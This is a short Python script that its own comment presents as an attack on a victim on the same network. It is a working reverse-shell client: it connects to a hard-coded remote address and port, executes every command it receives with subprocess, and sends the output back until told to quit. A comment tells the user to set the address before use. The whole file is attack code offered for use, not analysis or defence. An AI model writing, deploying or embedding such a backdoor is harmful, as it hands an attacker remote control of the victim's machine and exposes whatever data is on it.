#!/usr/local/bin/python3

# This is a local network attack, this can be used while the victim is on the same network

import socket
import subprocess
import json


def send_command(data, target):

    json_data = json.dumps(data)
    target.send(json_data.encode())


def receive_info(target):

    while True:
            try:
                    data = target.recv(1024)
                    data = data.decode()
                    return json.loads(data)
            except ValueError:
                    continue


def shell(sock):
    while True:
        command = receive_info(sock)
        if command == 'quit':
            break
        else:
            cmd = subprocess.getoutput(str(command))
            send_command(cmd, sock)


def main():
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.connect(('75.68,156.178', 6996)) # YOU MUST SET THIS PROPERLY BEFORE USING
    shell(sock)

    sock.close()


if __name__ == '__main__':

    main()
